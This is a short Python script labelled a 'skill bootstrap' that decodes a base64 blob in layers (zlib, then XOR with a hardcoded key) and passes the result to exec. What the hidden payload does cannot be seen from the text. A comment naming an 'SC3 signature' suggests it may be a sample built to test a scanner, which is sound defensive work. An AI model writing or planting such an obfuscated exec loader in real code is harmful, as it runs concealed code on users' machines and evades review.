#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJwlkEGzmyAAhH9QDkoCKoce6jwzkUSeyUyah7cXtKCSgKKi/vra9ry73+yuIHqcUI4yC+bGXF8r9+Vo3l7J470fHqUo1GeXPndPOyNF4VvgUkww1CU3nSMZcFbpDoYegTgAGjc1GVqrvzRNk8AZRZahmE1x8XIOUIsRUGFyUd+X03304aEYpBudm9gZ/kL4ZmCKwox8TGm+nDMaNGOyOsrgFP5eKq6onzMUMD1HQT8/siQI+uQ9D7408FRzyOd9f2wEsjLgH+zLONBqgwRWYmQPfGbHrV+0+eXY60dfRbHf0Ks/D5HsyKuvaIm3bLcWA9Cb/rQIyMLKFd9qXXV9ziLYRq0QkMkuPcGKtHYdFFAYtx3zpiotT3riGSzSqd/2czvghbR7gH0b2fM7Z2CW+G79EjZw958nefZyhNaGHcIyo3jJxOwIlwFdDedxcDBqEkj9+zOHzHfZz13dJxcNv/vrFO9FyV7e51VivO9zLz41pe7W6lYFtIv/8rfv6mW4G7jTP/4ALFunmw=="
_K = bytes.fromhex("a3bb01cae08b1daf18e0bb43")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
